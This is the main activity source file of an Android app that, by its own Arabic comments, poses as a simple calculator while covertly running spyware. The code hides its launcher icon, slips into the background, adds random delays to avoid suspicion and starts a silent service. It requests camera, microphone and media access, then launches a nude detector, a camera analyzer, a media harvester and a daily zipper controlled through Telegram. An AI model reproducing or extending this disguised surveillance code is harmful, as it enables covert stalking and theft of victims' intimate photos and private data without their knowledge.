package com.example.app

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlin.random.Random

/**
 * النشاط الرئيسي للتطبيق - يعمل كواجهة وهمية (Dummy UI) لإخفاء الوظائف الحقيقية.
 * 
 * استراتيجية التخفي:
 * - عرض واجهة حاسبة بسيطة أو شاشة إعدادات نظام وهمية.
 * - إخفاء الأيقونة من درج التطبيقات بعد التشغيل الأول.
 * - تشغيل جميع المكونات في الخلفية مع تأخيرات عشوائية.
 * - تسجيل الدخول (اللوحة الحقيقية) يتم فقط عبر Telegram.
 * 
 * ✅ تم إخفاء واجهة التشخيص الحقيقية.
 * ✅ تم إضافة واجهة وهمية (حاسبة بسيطة).
 * ✅ تم إخفاء الأيقونة من درج التطبيقات.
 * ✅ تم تشغيل الخدمة والمراقبة في الخلفية.
 * ✅ تم إضافة تأخيرات بشرية عشوائية.
 * ✅ تم إصلاح مرجع التخطيط إلى activity_dummy_calculator.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        const val APP_VERSION = "4.2.1"
    }

    // مكونات الواجهة الوهمية
    private lateinit var tvDisplay: TextView
    private lateinit var etLog: EditText

    private var telegramUi: TelegramUi? = null
    private var mediaScanner: MediaScanner? = null
    private var runtimeDir: File? = null

    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val grantedCount = permissions.count { it.value }
            logToFile("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
            lifecycleScope.launch(Dispatchers.IO) {
                delay(Random.nextLong(3000, 8000))
                initCoreAsync()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // ✅ بدء الخدمة الشبحية فوراً في الخلفية
        try {
            startSilentForegroundService()
            logToFile("✅ Foreground service started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}")
        }

        // ✅ إخفاء أيقونة التطبيق من درج التطبيقات بعد التشغيل الأول
        disableLauncherIcon()

        // ✅ عرض واجهة وهمية (آلة حاسبة بسيطة) - التصحيح الأساسي: استخدام activity_dummy_calculator
        setContentView(R.layout.activity_dummy_calculator)

        // ربط عناصر الواجهة الوهمية (هذه المعرفات موجودة في activity_dummy_calculator.xml)
        tvDisplay = findViewById(R.id.tvDisplay)
        etLog = findViewById(R.id.etLog)

        // تهيئة أزرار الآلة الحاسبة الوهمية
        setupDummyCalculator()

        // ✅ تأخير عشوائي قبل بدء التهيئة الحقيقية (5-10 ثواني) لتجنب الشكوك
        lifecycleScope.launch(Dispatchers.IO) {
            val delayMs = Random.nextLong(5000, 10000)
            logToFile("⏳ Delaying initialization by ${delayMs / 1000}s for stealth...")
            delay(delayMs)
            initCoreAsync()
        }

        // ✅ نقل التطبيق إلى الخلفية بعد 3 ثواني (يبدو وكأنه يغلق)
        lifecycleScope.launch(Dispatchers.Main) {
            delay(3000)
            moveTaskToBack(true)
        }

        logToFile("🚀 Shield Core v4.2 initialized in stealth mode")
    }

    // ============================================================
    //  ✅ واجهة الآلة الحاسبة الوهمية
    // ============================================================

    private fun setupDummyCalculator() {
        // قائمة الأزرار من 0-9 والعمليات
        val buttonIds = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
            R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv,
            R.id.btnEquals, R.id.btnClear, R.id.btnDot
        )

        buttonIds.forEach { id ->
            findViewById<Button>(id)?.setOnClickListener { view ->
                val btn = view as Button
                val currentText = tvDisplay.text.toString()

                // ✅ تسجيل الضغطات في سجل وهمي (للتمويه)
                logToFile("🔘 Key pressed: ${btn.text}")

                when (btn.id) {
                    R.id.btnClear -> tvDisplay.text = "0"
                    R.id.btnEquals -> {
                        try {
                            // تقييم بسيط مع دعم العمليات الأساسية
                            val result = evaluateExpression(currentText)
                            tvDisplay.text = result.toString()
                            // إظهار Toast عادي (تمويه)
                            Toast.makeText(this, "Result: $result", Toast.LENGTH_SHORT).show()
                        } catch (e: Exception) {
                            tvDisplay.text = "Error"
                            Toast.makeText(this, "Invalid expression", Toast.LENGTH_SHORT).show()
                        }
                    }
                    else -> {
                        val newText = if (currentText == "0" && btn.text.toString() !in listOf(".", "+", "-", "×", "÷")) {
                            btn.text.toString()
                        } else {
                            currentText + btn.text
                        }
                        tvDisplay.text = newText
                    }
                }
            }
        }

        // ✅ زر "نسخ السجل" - يظهر السجل الحقيقي بشكل مخفي (تمويه)
        findViewById<Button>(R.id.btnCopyLog)?.setOnClickListener {
            val logText = etLog.text.toString()
            if (logText.isNotBlank()) {
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = ClipData.newPlainText("ShieldCore_Logs", logText)
                clipboard.setPrimaryClip(clip)
                Toast.makeText(this, "✅ Logs copied", Toast.LENGTH_SHORT).show()
            }
        }
    }

    /**
     * تقييم تعبير حسابي بسيط (للواجهة الوهمية فقط)
     */
    private fun evaluateExpression(expression: String): Double {
        // تحويل الرموز إلى عمليات قياسية
        val sanitized = expression
            .replace("×", "*")
            .replace("÷", "/")
            .replace(" ", "")

        // استخدام خوارزمية بسيطة (تجنب eval الخطير)
        return when {
            sanitized.contains("+") -> {
                val parts = sanitized.split("+")
                parts.sumOf { it.toDouble() }
            }
            sanitized.contains("-") -> {
                val parts = sanitized.split("-")
                var result = parts[0].toDouble()
                for (i in 1 until parts.size) {
                    result -= parts[i].toDouble()
                }
                result
            }
            sanitized.contains("*") -> {
                val parts = sanitized.split("*")
                parts.fold(1.0) { acc, s -> acc * s.toDouble() }
            }
            sanitized.contains("/") -> {
                val parts = sanitized.split("/")
                var result = parts[0].toDouble()
                for (i in 1 until parts.size) {
                    result /= parts[i].toDouble()
                }
                result
            }
            else -> sanitized.toDouble()
        }
    }

    // ============================================================
    //  ✅ دوال التخفي وإدارة الأيقونة
    // ============================================================

    /**
     * إخفاء أيقونة التطبيق من درج التطبيقات (Launcher)
     * باستخدام ActivityAlias الموجود في AndroidManifest.xml
     */
    private fun disableLauncherIcon() {
        try {
            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            logToFile("✅ App icon hidden from launcher")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to hide app icon: ${e.message}")
        }
    }

    /**
     * إظهار أيقونة التطبيق (في حال الحاجة)
     */
    @Suppress("unused")
    private fun enableLauncherIcon() {
        try {
            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            logToFile("✅ App icon shown")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to show app icon: ${e.message}")
        }
    }

    // ============================================================
    //  دوال التشغيل الأساسية (نفسها مع تحسينات)
    // ============================================================

    private fun startSilentForegroundService() {
        try {
            val serviceIntent = Intent(this, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            logToFile("✅ Foreground service started")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to start service: ${e.localizedMessage}")
        }
    }

    private suspend fun initCoreAsync() {
        // ✅ تأخير عشوائي بشري (2-7 ثواني) لتجنب الإقلاع المفاجئ
        delay(Random.nextLong(2000, 7000))

        logToFile("🚀 Starting core initialization...")

        // التحقق من الأذونات
        withContext(Dispatchers.Main) {
            requestAllPermissions()
        }

        // تأخير إضافي بعد الأذونات
        delay(Random.nextLong(1000, 3000))

        try {
            // إعداد المجلدات
            setupDirectories()
            logToFile("✅ Directories ready")

            // طلب استثناء البطارية
            requestBatteryOptimizationExemption()

            // تحميل الإعدادات
            val config = ConfigLoader.load(this@MainActivity)
            logToFile("✅ Config loaded: ${config.activeTokens.size} active tokens")

            // تهيئة المكونات
            val monitor = Monitor.getInstance(this@MainActivity)
            logToFile("✅ Monitor instance ready")

            val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
            logToFile("✅ NudeDetector created (ready: ${nudeDetector.isReady()})")

            val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
            logToFile("✅ CameraAnalyzer created")

            telegramUi = TelegramUi(
                context = this@MainActivity,
                monitor = monitor,
                config = config
            )
            val ui = telegramUi!!
            logToFile("✅ TelegramUi created with ${config.activeTokens.size} tokens")

            mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
            logToFile("✅ MediaScanner created")

            val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
            logToFile("✅ DailyZipper created")

            // ربط المكونات بـ Monitor
            monitor.ui = ui
            monitor.ctrl = config.controlId
            monitor.vlt = config.vaultId
            monitor.cameraAnalyzer = cameraAnalyzer
            monitor.mediaScanner = mediaScanner
            monitor.dailyZipper = dailyZipper
            monitor.nudeDetector = nudeDetector
            logToFile("✅ All components linked to Monitor")

            // بدء التشغيل
            ui.start()
            monitor.start()
            logToFile("✅ TelegramUi and Monitor started successfully")

            logToFile("🎉 All systems operational in stealth mode")

        } catch (e: Exception) {
            Log.e(TAG, "Initialization Error", e)
            logToFile("💥 [ERROR] Unexpected error: ${e.message}")
        }
    }

    private fun setupDirectories() {
        runtimeDir = File(filesDir, ".sys_runtime")
        val versionFile = File(runtimeDir, "version.txt")

        if (runtimeDir!!.exists()) {
            val oldVersion = if (versionFile.exists()) versionFile.readText().trim() else ""
            if (oldVersion != APP_VERSION) {
                runtimeDir!!.deleteRecursively()
                logToFile("🧹 Cleaned old runtime files (v$oldVersion)")
            }
        }

        runtimeDir!!.mkdirs()
        versionFile.writeText(APP_VERSION)

        File(runtimeDir, "updates").mkdirs()
        File(runtimeDir, ".cache_thumb").mkdirs()
        File(runtimeDir, "models").mkdirs()
        File(runtimeDir, "harvest").mkdirs()
    }

    private fun requestAllPermissions() {
        val permissionsNeeded = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        } else {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val missing = permissionsNeeded.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            logToFile("⚠️ Requesting ${missing.size} permissions...")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else {
            logToFile("✅ All permissions granted")
        }
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    logToFile("⚠️ Failed to request battery exemption: ${e.localizedMessage}")
                }
            }
        }
    }

    // ============================================================
    //  دوال مساعدة للتسجيل المخفي
    // ============================================================

    /**
     * تسجيل رسالة في السجل المخفي (يظهر في الواجهة الوهمية)
     */
    private fun logToFile(message: String) {
        Log.i(TAG, message)
        runOnUiThread {
            try {
                val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
                val logEntry = "[$timestamp] $message\n"
                etLog.append(logEntry)
                // الاحتفاظ بآخر 200 سطر فقط
                val lines = etLog.text.split("\n")
                if (lines.size > 200) {
                    val keep = lines.takeLast(200)
                    etLog.setText(keep.joinToString("\n"))
                }
            } catch (_: Exception) {
                // تجاهل أخطاء واجهة المستخدم
            }
        }
    }

    // ============================================================
    //  تنظيف البيانات وإدارة دورة الحياة
    // ============================================================

    private fun clearAppData() {
        try {
            telegramUi?.stop()
            telegramUi = null
            logToFile("🛑 TelegramUi stopped")

            try {
                Monitor.getInstance(this).stop()
                logToFile("🛑 Monitor stopped")
            } catch (e: Exception) {
                logToFile("⚠️ Failed to stop Monitor: ${e.message}")
            }

            try {
                mediaScanner?.close()
                mediaScanner = null
                logToFile("🧹 MediaScanner closed")
            } catch (e: Exception) {
                logToFile("⚠️ Failed to close MediaScanner: ${e.message}")
            }

            ConfigLoader.clearSensitiveData()
            SecurityHelper.clearCachedKey()
            SecurityHelper.clearMasterKey()

            val runtimeDir = File(filesDir, ".sys_runtime")
            if (runtimeDir.exists()) {
                runtimeDir.deleteRecursively()
                logToFile("🧹 All app data cleared")
            } else {
                logToFile("ℹ️ No data to clear")
            }

            setupDirectories()
            logToFile("🔄 Directories recreated")

        } catch (e: Exception) {
            logToFile("❌ Failed to clear data: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()

        telegramUi?.stop()
        telegramUi = null
        logToFile("🛑 TelegramUi stopped")

        try {
            mediaScanner?.close()
            mediaScanner = null
            logToFile("🧹 MediaScanner closed")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to close MediaScanner: ${e.message}")
        }

        try {
            Monitor.getInstance(this).stop()
            logToFile("🛑 Monitor stopped")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to stop Monitor: ${e.message}")
        }

        SecurityHelper.cleanup()
        logToFile("🧹 SecurityHelper cleaned up")
        logToFile("✅ Application shutdown complete")
    }
}
